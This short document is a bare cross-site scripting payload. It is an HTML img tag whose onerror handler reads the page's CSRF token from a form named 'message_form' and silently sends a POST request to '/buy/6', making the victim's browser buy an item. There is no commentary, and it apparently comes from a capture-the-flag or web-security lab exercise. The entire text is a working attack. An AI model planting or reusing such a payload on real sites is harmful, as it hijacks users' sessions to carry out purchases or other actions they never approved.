<img src="1" onerror='
  const fata=new FormData();
  const form = document.getElementById("message_form");
  const name = form.elements["csrf_token"].value;
  fata.append("csrf_token",name);
  var changeReq = new XMLHttpRequest();
  changeReq.open("POST", "/buy/6", true);
  changeReq.send(fata);
'>
